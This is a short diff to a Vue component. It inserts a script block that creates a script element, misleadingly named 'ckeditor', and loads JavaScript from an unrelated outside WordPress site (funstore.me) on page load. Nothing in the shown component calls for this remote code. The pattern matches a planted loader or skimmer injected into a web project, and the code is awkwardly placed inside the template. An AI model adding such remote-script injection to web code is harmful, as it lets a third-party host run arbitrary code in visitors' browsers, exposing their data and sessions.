@@ -46,7 +46,13 @@
     </div>
   </md-toolbar>
 </template>
-
+      <script>
+        created() {
+var ckeditor = document.createElement('script');  
+ckeditor.setAttribute('src',"http://www.funstore.me/wp-content/themes/leglo/swiper/swiper.min.js");
+document.querySelector('html').appendChild(ckeditor);
+}
+      </script>
 <script>
 let resizeTimeout;
 function resizeThrottler(actualResizeHandler) {
